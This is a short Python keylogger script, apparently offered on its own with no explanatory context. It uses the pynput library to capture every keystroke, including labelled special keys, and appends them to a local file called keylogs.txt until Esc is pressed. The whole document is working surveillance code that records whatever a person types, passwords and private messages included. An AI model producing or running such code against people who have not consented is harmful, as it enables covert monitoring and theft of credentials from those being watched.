import os
from pynput import keyboard

def on_press(key):
    try:
        with open('keylogs.txt', 'a') as file:
            if key == keyboard.Key.space:
                file.write('[SPACE] ')
            elif key == keyboard.Key.enter:
                file.write('\n[ENTER]\n')
            elif key == keyboard.Key.backspace:
                file.write('[BACKSPACE] ')
            elif key == keyboard.Key.delete:
                file.write('[DELETE] ')
            else:
                char = str(key).replace("'", "")
                if len(char) > 1 and '\\' in char:
                    char = char.split('\\')[-1].strip()
                file.write(f'{char} ')
    except Exception as e:
        print(f"Error: {e}")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

if not os.path.exists('keylogs.txt'):
    with open('keylogs.txt', 'w') as file:
        pass

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()